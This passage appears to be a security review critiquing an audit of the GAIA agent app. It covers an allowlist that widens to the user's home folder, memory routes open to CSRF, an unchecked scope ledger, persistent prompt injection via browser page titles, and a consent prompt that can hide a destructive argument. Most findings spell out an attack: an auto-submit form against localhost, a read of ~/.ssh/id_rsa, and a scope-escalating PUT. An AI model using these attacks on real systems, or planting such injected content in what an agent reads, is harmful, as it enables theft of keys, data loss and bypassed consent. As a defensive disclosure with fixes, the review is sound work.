- **Fix:** build `char* argv[]` from `command_` + `args_` and call `execvp` — no shell, no
  quoting, no escaping. Keep the concatenated string only for the `debug_` log at `:568`.
- **Two siblings in the same file:** `:326-334` hands the same unescaped concatenation to
  Windows `CreateProcessA` (no shell, so not injection — but any arg containing a quote or a
  space-plus-quote is silently mangled), and `:747-749` turns a server-side `listTools` error
  into an empty tool list with no log, so the agent reports a server as having no tools.
- **Editorial note:** the report has this in **Appendix D as an unverified hypothesis** ("naive
  argv concatenation in `StdioTransport` (POSIX shell metacharacters) … not re-checked at HEAD").
  It is verified now, at HEAD, and it is a 🔴. The two sibling Appendix-D hypotheses on the same
  file also confirm: `protocolVersion "1.0.0"` (a version that does not exist) and no
  `content[]`/`isError` unwrapping, so a failed MCP tool call reaches the model as a success.
  **Move all three out of Appendix D into §2.1 and §3.8.**
- **Confidence:** High.

### M3. 🔴 A session's file allowlist silently expands to the whole directory a document sits in — `$HOME` included

- **Where:** `src/gaia/ui/_chat_helpers.py:926` (`_compute_allowed_paths`), consumed at `:974`
  (`_session_agent_kwargs` → `allowed_paths`), called at `:1365` and `:1765`.
- **What:** The per-request allowlist is the set of **parent directories** of the attached
  documents, handed to a `prompt_profile="full"` ChatAgent that registers
  `read_file`/`write_file`/`edit_file` and shell tools. `PathValidator` applies **no
  sensitive-file denylist on reads** — `is_write_blocked` is reachable only from `validate_write`
  (`security.py:584`).
- **Failure scenario:** the user attaches `C:\Users\alice\notes.txt` (or anything on the Desktop,
  in Downloads, or in the profile root). The parent — the whole home tree — becomes allowlisted
  for the turn. `read_file("C:\\Users\\alice\\.ssh\\id_rsa")` then returns the key:
  `is_path_allowed` matches on the prefix and `read_file` never consults a sensitive list.
- **Evidence:**
  ```python
  # _chat_helpers.py:934
  dirs = set()
  for fp in rag_file_paths:
      dirs.add(str(Path(fp).parent))
  ```
  ```python
  # file_io_tools.py:54 — the allowlist is the ONLY gate on read
  if not self.path_validator.is_path_allowed(file_path):
  ```
- **Fix:** grant the **files**, not their parents — `PathValidator` already matches an exact path.
  If a directory grant is genuinely needed, refuse `Path.home()`, drive roots, and any
  `BLOCKED_DIRECTORIES` ancestor, and apply `SENSITIVE_FILE_NAMES`/`SENSITIVE_EXTENSIONS` to
  reads as well as writes.
- **Editorial note:** the report *has* the mechanism — as a trailing clause inside I35 ("the Agent
  UI allowlist is the parent dir of every attached document … so attaching a file in `$HOME`
  makes `$HOME` writable"). It missed that **reads have no denylist at all**, which makes this an
  exfiltration primitive, not just a write one. Promote to its own 🔴.
- **Confidence:** High.

### M4. 🔴 Six mutating memory routes are CSRF-reachable; `prune` and `refresh-system-context` destroy data

- **Where:** `src/gaia/ui/routers/memory.py:963` (`prune_memory`), `:1072`
  (`refresh_system_context`), `:949` (`rebuild_fts`), `:669` (`trigger_consolidation`), `:694`
  (`rebuild_embeddings`), `:741` (`trigger_reconciliation`).
- **What:** `_require_ui_header` is *defined in this file* at `:41` and applied to **3 of ~20**
  mutating routes. The six that take all parameters from the query string with no request body
  are reachable by a plain cross-origin form POST — a "simple request" that never triggers the
  preflight the guard depends on.
- **Failure scenario:** the user has the Agent UI running and visits a page containing
  `<form action="http://localhost:4200/api/memory/prune?days=7" method="POST">` with a one-line
  auto-submit. All tool history, conversations and low-confidence knowledge older than 7 days are
  deleted — irreversible, no confirmation, no UI involvement.
  `/api/memory/refresh-system-context` runs `store.delete_by_category("system")` (`:1050`) and
  re-scans the host.
- **Evidence:** reproduced against a throwaway FastAPI app mirroring the exact signatures (temp
  file outside the repo, deleted afterwards): `form POST prune → 200 {"pruned":7}`;
  `text/plain POST knowledge → 422`; `DELETE all (no header) → 403`. By contrast
  `routers/connectors.py` carries the guard on **every** POST/PUT/DELETE — 100 % coverage — which
  is what makes `memory.py` an oversight rather than a design decision.
- **Fix:** set the dependency once as an `APIRouter(dependencies=[...])` default so a new route
  cannot ship unguarded, and collapse the four copies of `_require_ui_header` into one.
- **Confidence:** High.

### M5. 🔴 `PUT /api/connectors/{id}/grants/{agent_id}` writes the authorization ledger with no scope ceiling

- **Where:** `src/gaia/ui/routers/connectors.py:962` (`put_grant`) →
  `src/gaia/connectors/grants.py:155` (`grant_agent`).
- **What:** The grants ledger is the sole gate on agent access to a connector
  (`handler.py:154-163` → `check_agent_grant`). This route writes it straight from client input:
  no `REGISTRY.get(connector_id)` existence check, no agent check, and **no check that the
  requested scopes are within `spec.available_scopes`**. `grant_agent` validates nothing.
- **Failure scenario:** `PUT /api/connectors/google/grants/installed:email` with
  `{"scopes":["https://www.googleapis.com/auth/drive","https://mail.google.com/"]}` writes those
  scopes; `check_agent_grant` then returns `True` for any Drive or full-mailbox call from that
  agent — scopes the connector never advertised and the agent never declared. A typo'd connector
  id returns **200** and persists a phantom key nothing reads.
- **Evidence:** the file's *other* grant path documents this exact hazard as something it
  deliberately prevents (`connectors.py:298-306`): "a declared scope outside the connector's
  `available_scopes` → 400 … the exact dead-end / escalation this flow removes" — and
  `put_activation`, two routes down, *does* call `_require_mcp_server(connector_id)` (`:1003`).
- **Fix:** resolve the spec first (404 on `KeyError`), reject out-of-ceiling scopes with the same
  400 / `scope_not_allowed` shape `_resolve_grant_scopes` already emits; push both checks into
  `grants.grant_agent` so the CLI cannot drift from the router.
- **Editorial note:** this is the *other half* of C1. C1 says the grant check is bypassed because
  identity is lost; M5 says the ledger it checks against can be set to arbitrary scopes by any
  local caller. **Fixing C1 without M5 makes the boundary real and then lets anyone move it.**
- **Confidence:** High.

### M6. 🔴 The Agent UI can block a chat turn forever on `input()` printed to the *server's* terminal

- **Where:** `_chat_helpers.py:1918` (`silent_mode=False`) and `:494`; sinks at
  `src/gaia/security.py:462` (`_prompt_user_for_access`) and `agent.py:6472` (max-steps).
- **What:** The streaming path builds the agent with `silent_mode=False` and runs it in a daemon
  thread. Both sinks call `input()` when `sys.stdin.isatty()` — true for the documented dev launch
  (`uv run python -m gaia.ui.server --debug`) and for `gaia chat --ui` from a terminal.
- **Failure scenario:** the browser user asks for a file outside the (very narrow — see M3)
  allowlist → `is_path_allowed(path)` defaults `prompt_user=True` → `input("Allow this access?
  [y]es / [n]o / [a]lways: ")` blocks the producer thread. The browser gets keepalives for 600 s
  then `Response timed out`; `producer.join(timeout=5.0)` fails, logs "Producer thread still
  running after stream ended", and the thread stays blocked on the server's stdin forever —
  swallowing the next line the operator types into that terminal.
- **Fix:** pass `prompt_user=False` on every UI-driven validator call. `_is_interactive()` is the
  wrong signal: the *server* having a TTY says nothing about the *requester* having one. The UI
  already owns an interactive channel (`permission_request` / `/api/chat/confirm-tool`).
- **Editorial note:** the report has this as **I3 at Medium confidence**, naming only the
  max-steps sink ("Any UI conversation that hits 50 steps"). The `PathValidator` sink is far more
  reachable — one out-of-allowlist read, which M3 makes likely — and deterministic once reached.
  **Merge into a single 🔴 and drop the Medium.**
- **Confidence:** High (the block is certain once reached; reachability requires a
  terminal-launched server — the Electron shell pipes stdin and is unaffected).

### M7. 🟡 `commit-discovery` / `commit-inference` bypass the memory category validator

`memory.py:1557` and `:1584` take `List[Dict[str, Any]]` and pass `item.get("category","profile")`
straight to `store.store()`, which validates nothing (`memory_store.py:751-800`; only `seed_bulk`
validates). Every other write path in the router goes through `KnowledgeCreate`. The module header
imports `VALID_CATEGORIES` and claims it keeps "all three validation sites … in sync
automatically" — this path never consults it. A `category: "permission"` item therefore writes a
row `memory_store.py:105-115` explicitly reserves. **This is a second route to I11**, which the
report scores 🟡 and which I argue should be 🔴 (§4.1).

### M8. 🟡 Browser history reaches the profiling LLM undelimited, and the output lands in the system prompt

`memory.py:1301` (`stream_inference`) concatenates scanner output — browser domains and page
*titles*, app names, personal filenames — into `_INFER_PROMPT` (`:1114-1145`) with no fencing and
no "treat as data" instruction. On approval, `commit_inference` stores the result as
`category="profile"`, which `agents/base/memory.py:2026-2031` renders into the agent's **system
prompt**. An attacker-controlled page title is a persistent-prompt-injection vector gated only by
a human clicking Approve on a plausible-looking insight list. 🟡 because the approval gate is real
— but the user approves the *LLM's* output, not the injected source line.

### M9. 🟡 `POST /v1/connections/{provider}` persists OAuth secrets before validating the provider

`connectors.py:1082` → `connectors/api.py:543-550`: `save_provider_credentials(provider,
client_id, client_secret)` runs at step 4; `get_provider(provider)` at step 5 raises a bare
`KeyError` for an unknown id. `KeyError` is not a `ConnectorsError`, so it escapes the router's
handler as a flat `500 {"detail":"Internal server error"}`. A typo'd provider writes the real
`client_secret` into the OS keyring under `provider:<typo>` and the caller is told nothing; only
`revoke_forwarded_connection` clears it, and the caller has no reason to call it. The function's
own comment asserts the opposite: "the failure path must leave the keyring untouched."

### M10. 🟡 Fail-loudly violations concentrated in `ui/routers/memory.py` — 18 handlers

Two are worse than the rest: **`:763`** — `trigger_reconciliation` catches an agent-path failure,
logs a warning, and **silently runs the standalone implementation instead** (the "try the other
provider" glue CLAUDE.md names explicitly); and **`:1578`/`:1616`** — `commit_discovery` /
`commit_inference` swallow per-item failures at `logger.debug` and return `{"stored": 7}` when the
user approved 10, with no indication which three were dropped. This also **corrects the
coordinator's silent-swallow inventory**: the report says the densest file is
`agents/base/system_context.py` (20) "not `ui/`" — `ui/routers/memory.py` was never counted and
has 18.

### M11. 🟡 A consent prompt can drop a destructive argument behind a bare ellipsis

- **Where:** `src/gaia/ui/sse_translation.py:640` (`render_invocation`), reached from
  `_render_args_summary` → `needs_confirmation.summary`.
- **What:** Per-*value* elision is careful (`"… [+N more characters not shown]"`), but the
  whole-clause cap at `INVOCATION_TOTAL_CHARS = 1200` appends a **bare** `"…"` — the exact thing
  the code six lines above forbids. Arguments render in `sorted(args)` order, so anything
  alphabetically late simply vanishes from the modal.
- **Failure scenario:** a gated tool called as `{"command": "<1200 chars of setup>",
  "yes_delete_remote": true}`. The clause is cut after `command=…`; `yes_delete_remote` never
  appears. The user reads a plausible command, approves, and a destructive flag they were never
  shown executes.
- **Evidence:** the rule and its violation, in the same function:
  ```python
  # sse_translation.py:634 — the rule
  # Never a bare "…". A silent cut reads as the whole value, so the
  # user approves text they were never shown and does not know it.
  # sse_translation.py:641 — the rule being broken
  if len(clause) > INVOCATION_TOTAL_CHARS:
      clause = clause[:INVOCATION_TOTAL_CHARS] + "…"
  ```
  The module docstring promises the opposite: *"Every argument name is shown — a hidden key is a
  hidden side effect."*
- **Fix:** budget per-argument instead of truncating the joined clause; render every key and
  annotate drops the way values are (`[+N arguments not shown: yes_delete_remote, …]`).
- **Editorial note:** this qualifies Appendix C's "confirmation gate on every path (MCP/REST
  cannot bypass — tested)". The *gate* holds; what the gate **shows the user** can omit the
  dangerous argument. `sse_translation.py` is on the report's not-read list.
- **Confidence:** High.

### M12. 🟡 The "session-scoped" allowlist silently unions a global, CLI-written grant list

- **Where:** `src/gaia/security.py:271` (`_load_persisted_paths`, called unconditionally from
  `PathValidator.__init__`) vs the docstring claim at `src/gaia/ui/_chat_helpers.py:927`.
- **What:** Every `PathValidator` — including the one the Agent UI builds per session — unions in
  whatever is in `~/.gaia/cache/allowed_paths.json`, which the **CLI** writes whenever a user
  answers `[a]lways` at a prompt. `_compute_allowed_paths`'s docstring says the opposite: the CWD
  fallback exists *"to avoid granting unnecessarily broad access across unrelated projects on the
  same machine."*
- **Failure scenario:** a developer answers "always" once at a `gaia chat` CLI prompt for
  `C:\work\clientA`. Every later Agent UI session — different surface, different trust context —
  silently carries read+write access to it. No expiry, no revocation UI, nothing in Settings.
- **Fix:** make persisted-path loading opt-in (`PathValidator(..., load_persisted=False)`) and
  disable it for host-supplied allowlists, consistent with `registry.py:138` already treating
  `allowed_paths` as `_SECURITY_RELEVANT_KWARGS`. At minimum, fix the docstring.
- **Editorial note:** compounds M3 and qualifies a second Appendix C entry — "PathValidator
  resolves symlinks, `os.sep`-guarded prefix, auto-denies non-interactive, fails closed" is all
  true and omits that it also inherits a machine-global grant list. It is also the same
  standing-grant-with-no-revocation shape as C13, on a different surface.
- **Confidence:** High.

### M13. 🟡 The UI's pre-flight reload halves a GPU session's context window, silently

- **Where:** `src/gaia/ui/_chat_helpers.py:1301` (`_maybe_load_expected_model`), called at `:1601`
  and `:2192`.
- **What:** `_apply_device_model` resolves `device_ctx = GPU_CTX_SIZE (65536)` for a GPU session
  and threads it into `ChatAgentConfig.min_context_size`. `_maybe_load_expected_model` then takes
  **no ctx parameter at all** and hardcodes `ctx_size=DEFAULT_CONTEXT_SIZE` (32768) on reload —
  with `device_ctx` in scope at the call site and not passed.
- **Failure scenario:** GPU session; the model slot holds something else (an eval ran, or the user
  switched sessions) → unload → `load_model(model_id, ctx_size=32768)`. The turn runs at half the
  window the device profile pins, so a long-document turn truncates or overflows. Nothing logs the
  downgrade; the user sees only "Loading LLM model…".
- **Fix:** give `_maybe_load_expected_model` a `required_ctx` parameter, pass
  `device_ctx or DEFAULT_CONTEXT_SIZE` from both call sites, and use it for both the
  `ctx_too_small` comparison and the `load_model` call.
- **Editorial note:** this is a **new instance of the #1030 silent-context-capping class** the
  report cites as its canonical cautionary tale, on a call site the I17/I18/I20 cluster does not
  cover. It belongs in §8 item 6's "single source of truth for the context window".
- **Confidence:** High.

### M14. Three smaller ones from the same read

- **🟡 `_index_document`'s path validation is vacuous** (`_chat_helpers.py:2844`):
  `allowed = [str(filepath.parent), str(Path.home())]` means `RAGSDK`'s
  `is_path_allowed(file_path, prompt_user=False)` (`rag/sdk.py:273`) can never fail for the file
  being indexed, and `Path.home()` widens it further for no reachable purpose. A check that looks
  like enforcement and is not — the same shape as C7's `hasattr` guards.
- **🟡 `rag/app.py` and `rag/demo.py` advertise a `gaia rag` command that does not exist.**
  No `add_parser("rag")` in `cli.py`, no `console_scripts` entry; `demo.py` devotes nine lines to
  it and `app.py:76` tells a user with no indexed documents to run `gaia rag index document.pdf`.
  The docs reviewer's argparse-vs-`cli.mdx` diff could not catch this because the strings live in
  `src/`, not `docs/` — worth extending that check's scope.
- **🟡 `pdf_utils.py:183` swallows an XObject-resolution failure into "this page has no images"**,
  and `sdk.py:815-818` swallows it a second time. `sdk.py` uses that boolean as the sole gate on
  whether the VLM runs, so a damaged page silently degrades to an empty chunk with nothing logged
  at any level — indistinguishable from a genuinely blank page, and the user gets a confident
  ungrounded answer. (Also: `document_monitor.py:182` marks a document on an unplugged drive
  "missing" *permanently* — the mtime fast path returns before the status repair, and the mtime
  never changes while the drive is away.)

### Cleared on a full read (so nobody re-audits)

- **`ui/routers/connectors.py` CSRF coverage is 100 %** — every POST/PUT/DELETE carries the guard.
  Its secret masking is deliberate and correct throughout (`oauth_client` returns
  `has_secret: bool`; `/_debug` is `GAIA_DEBUG`-gated and returns a backend *class name*; the
  device-code flow withholds `device_code`). Route ordering is correct — the greedy
  `GET /{connector_id}` is registered last.
- **No path traversal in either `memory.py` or `connectors.py`** — neither constructs a `Path`
  from request data. No SQL construction; every list endpoint has a `Query(..., ge=, le=)` cap.
- **`admin_clear` / `admin_seed` gating is sound** — `_require_memory_admin` reads
  `GAIA_MEMORY_ADMIN` per request, defaults closed, and `seed_bulk` validates the batch atomically
  before any insert.
- **`rag/pdf_utils.py`** — one 🟡 (`except Exception: pass` turns an unreadable page into "this
  page has no images"); decompression-bomb protection is Pillow's default rather than the repo's,
  which is worth a comment but not a finding.

### Also worth a line: `GET /api/connectors/agent-mcps` returns MCP `command` + `args` verbatim

`connectors.py:616`, response at `:672-683`. The `env` block is correctly excluded — but MCP
servers routinely carry credentials as CLI arguments (`["-y","@some/server","--api-key","sk-…"]`)
and those come back in full, on an unguarded GET, one function away from deliberate masking.
🟡, Medium confidence (depends on how the user wrote `mcp_servers.json`; the leak path is certain).

---

## 7. Actionability of §10

### 7.1 Week 1 is not "all S; each is one PR"

| # | Claimed | Actual | Why |
|---|---|---|---|
| 1 | S, 1 PR | **M, 3 PRs, blocked** | §4.2(a): needs I83 (billing) cleared and I82 / `update-release-branch.yml` chained before "then tag" can succeed. |
| 2 | S | S ✓ | But add the doc change: `docs/sdk/infrastructure/connectors.mdx:257-262` teaches the ungated pattern that fail-closed will start rejecting. Shipping the fix without the doc breaks the documented public contract silently. |
| 3 | S | S ✓ | Correctly scoped as interim; argv deferred to Month 1 and said so. |
| 4 | S | S ✓ | |
| 5 | S | S ✓ | |
| 6 | S | **M** | "Middleware enforcing `X-Gaia-UI` on all mutating `/api|/v1`" changes the contract for every non-browser client — the Electron shell, the TUI's daemon client, `gaia mcp`. Each must be confirmed to send the header first; the plan does not name that inventory step. |
| 7 | S | **M, 3 PRs** | Three different servers. Mounting `require_caller_token` in `build_api_app` is a breaking change for every existing `--api` consumer and needs a token-provisioning story. |
| 8 | S | **mixed** | C12 is S. C13 "move standing grants server-side" needs a backend grant store *and* a Settings → Permissions UI — M. The plan's own hedge ("or at least session-scope") admits it. |
| 9 | S | S ✓ | |
| 10 | S, 1 PR | 4 × S | Four unrelated fixes in one bullet; fine, but not one PR. |
| 11 | S | **M, and ordered wrong** | Adding a `windows-latest` job with ~270 tests red makes CI red on day one. The loopback-guard fix, the two `encoding="utf-8"` helpers, the `*.sh text eol=lf` attribute and the POSIX `skipif`s must land **first**, and the job should start `continue-on-error: true` for one cycle. |
| 12 | S, 1 PR | 5 × S | Same as 10. |

**Edit the Week-1 header** from "(all S; each is one PR)" to "(12 workstreams, ~25 PRs; items 1,
6, 7 and 11 are M)". The current header is exactly the kind of claim a planner acts on.

### 7.2 Ordering dependencies the plan gets wrong

1. **Item 1's "then tag" before I83 / I82 are handled** — §4.2(a). Highest-impact correction in
   §10: as written, the first action a maintainer takes fails for a reason the report already
   documents two sections away.
2. **Item 11's Windows job before its four prerequisite fixes** — as written it lands a red lane
   and gets reverted.
3. **Item 2 (fail-closed grants) before M5 (the ledger has no scope ceiling).** Making the grant
   check mandatory while the ledger it reads accepts arbitrary scopes from any local caller
   converts a dead control into a forgeable one. **M5 must be in the same PR as item 2.**
4. **Item 6 (CSRF middleware) makes M4 moot** — good — but the middleware must land *before*
   anyone hand-patches `memory.py`'s six routes, or the two fixes conflict. Say which is
   authoritative.
5. **Month 1's `FileAccessPolicy` should come before, not after, M3's allowlist fix** — or the
   narrow fix (grant files, not parents) gets reverted by the broader refactor. Name M3 as the
   first step of the `FileAccessPolicy` item rather than a separate change.

### 7.3 Month 1 → Week 1

- **C24, the SNI fix.** A one-adapter-method change — §9 C says exactly that — that restores
  "summarise this URL" for 8 of 14 tested sites including `github.com` and the project's own
  `amd-gaia.ai`. It is currently buried in Month 1's RAG bullet behind four other items. Highest
  user-visible value per line in the report; move it into Week-1 item 12 with the other two-line
  product fixes.
- **I47, `_encode_texts` drops a vector but keeps the chunk.** Every consumer maps FAISS row *i*
  to `chunks[i]`, so retrieval returns *the wrong chunk text* — silently, in normal use, with no
  error. Under REVIEW.md that is a wrong-answer bug; it should not sit below a docs sweep. Move to
  Week 1, or promote to 🔴.

### 7.4 Week 1 → Month 1

Nothing needs demoting outright, but **item 11 should be split**: the four environmental fixes in
Week 1, the `windows-latest` job (non-blocking) at the end of Week 1, "make it a required check"
in Month 1.

---

## Summary — the ten edits that matter most

1. **Strike C8's claim that `openai_server.py:178` carries a wildcard.** It is false at HEAD and
   Appendix C already says so — the report contradicts itself inside a 🔴. Replace with the auth
   finding, which stands, and log the cross-reviewer discrepancy in Appendix A. (§1.6)
2. **Fix C9's numbers: 50 of 75 mutating routes are unguarded and 15 are forgeable today** — not
   "~28 of ~45" — and name the six the report never lists, including `refresh_system_context`,
   which deletes data. Add that `_require_ui_header` exists in four copies. (§1.7)
3. **Replace every Appendix B per-file count.** Six of nine rows are wrong; raw totals are
   34 🔴 / 153 🟡 / 82 🟢. Add the footnote explaining that 30/99 count consolidated IDs while
   ≈120 counts individual items. (§1.1)
4. **Change "~40 probes" to 29.** The claim says "noted as *probe*", which makes it checkable
   against the document, and the document contains 29. (§1.3)
5. **Add the five 🔴-class findings from the unaudited files** — M1 (PowerShell injection via a
   PPTX filename, no model involved), M2 (`/bin/sh -c` in the C++ MCP client, currently an
   *unverified hypothesis* in Appendix D), M3 (session allowlist widens to `$HOME` and reads have
   no denylist), M4 (six CSRF-able memory routes), M5 (grants ledger with no scope ceiling). Four
   of the five files I read produced a 🔴. Add M11-M14 as 🟡s in the same pass — M11 (a consent
   prompt can drop a destructive argument behind a bare ellipsis) and M12 (the "session-scoped"
   allowlist unions a machine-global CLI grant list) each qualify an Appendix C entry. (§6)
6. **Fix §10 Week-1 item 1's ordering.** "Then tag" is blocked by I83 (the release gate is red on
   Anthropic billing) and races I82 / `update-release-branch.yml`. Neither appears in Week 1. This
   is the item a maintainer will attempt first, and as written it fails. (§7.2)
7. **Re-rank four 🟡s to 🔴** — I34 (tunnel token reads `~/.ssh` and the credential store), I35
   (write guardrails miss `.bashrc` / autostart / `.git/hooks`), I84 (fork PRs on persistent
   self-hosted runners), I11 (the LLM can mint `system`/`profile` memory rows) — and drop C30 to
   🟡: a wrong install command misleads, it does not break, lose data, or expose anything. (§4.1)
8. **Restore four dropped caveats:** C4's "behind one confirmation click unless auto-approve is
   on" (§1 #3), C12's "one click" (§1 #9), C25's "depends on room level" (§1 #8), and I41's
   "bounded to chat/RAG — no shell or file tools". Each is the difference between a finding a
   maintainer can size and one they cannot. (§2.1)
9. **Restore the three highest-value dropped items:** `_kill_stale_ngrok` kills every ngrok on the
   machine on every tunnel start; `rich.Console().print` in `lemonade_client.py:3281` corrupts
   `gaia mcp serve --stdio`'s JSON-RPC framing (both stdio servers' own comments say they
   prevented exactly this); and `publish_agents.yml` is `if: false` (#1179), which is the root
   cause C30 documents downstream of. (§3)
10. **Two structural edits for readability:** rewrite §1's 118-word opening so the finding comes
    first (CLAUDE.md's own rule), and convert I93, I92 and I45 from multi-hundred-word single
    bullets into tables — as written, no part of I93 can be assigned, tracked, or closed. (§5)

---

### What this critique does *not* dispute

The 30 criticals are, with the single exception of C8's CORS clause, well-evidenced and correctly
severe. Every line number I re-opened was accurate. Confidence qualifiers survive consolidation
more often than they are dropped. §9's feature ranking is grounded in issue numbers and code paths
throughout. Appendix C is the most useful artefact in the set and should be preserved verbatim.
The problems are in the arithmetic, in four summary-level overstatements, and in the fact that the
honest-gaps list turned out to contain five more criticals — not in the review's judgement.
